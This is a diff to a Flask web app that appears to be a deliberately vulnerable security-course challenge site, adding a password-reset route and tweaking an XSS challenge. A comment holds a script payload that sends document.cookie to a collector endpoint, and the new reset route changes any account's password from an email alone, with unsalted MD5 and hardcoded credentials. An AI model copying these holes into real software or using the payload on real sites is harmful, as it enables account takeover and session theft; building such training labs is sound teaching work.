@@ -11,7 +11,7 @@ app.config['SECRET_KEY'] = 'comp6841extension'
 
 # Connect to the database
 conn = psycopg2.connect(database="comp6841db", user="postgres",
-                        password="postgres", host="localhost", port="5044")
+                        password="postgres", host="localhost", port="5432")
 
 crud_user = CrudUser(conn)
 
@@ -29,7 +29,7 @@ def homepage():
         pw_hashed = md5_hash.hexdigest()
         query_res = crud_user.searchUser(username, pw_hashed)
 
-        print("query_res = ", query_res)
+        # print("query_res = ", query_res)
 
         if query_res[1]:
             return render_template("index.html", entries = query_res[0][0], form = f, error = None)
@@ -119,9 +119,6 @@ def viewCourseDetail (course_name) :
     # if course_info == None:
     course_info =  crud_user.searchCourseByName(course_name=course_name)
     c_id = str(course_info['id'])
-
-    print(f"course id = {c_id}, type = {type(c_id)}")
-
     all_comments = crud_user.selectAllCommentsByCourse(c_id)
 
     # print(f'course_info = {course_info}')
@@ -151,6 +148,8 @@ def viewCourseDetail (course_name) :
             if helper.check_finish_xss(single_comment):
                 crud_user.remove_xss_comment(c_id, single_comment)
                 return render_template("solvedChallenge/challenge3.html")
+            
+        return redirect(url_for('viewCourseDetail', course_name=course_name))
     
     elif request.method == 'POST' and 'form_question' in request.form:
         print("ask question")
@@ -185,6 +184,26 @@ def eat_ur_cookie():
     print(f"cookie = {get_cookie}")
     # <script>document.location="http://127.0.0.1:5000/i-am-bad?q="%2Bdocument.cookie</script>
     return render_template("bad-xss.html", username = get_cookie)
+
+@app.route("/reset-password", methods=['GET', 'POST'])
+def reset_pw():
+    if request.method == 'POST':
+        user_email = request.form.get('email')
+        password = request.form.get('new_password')
+        confirm_password = request.form.get('confirm_password')
+
+        if password == confirm_password:
+
+            md5_hash = hashlib.md5()
+            # Update the hash object with the bytes of the input string
+            md5_hash.update(password.encode())
+
+            # Get the full hexadecimal representation of the hash
+            pw_hashed = md5_hash.hexdigest()
+            crud_user.change_password(user_email, pw_hashed)
+            return redirect(url_for('homepage'))
+        
+    return render_template("change-password.html")
 
 if __name__ == '__main__':
     app.run(debug=True)
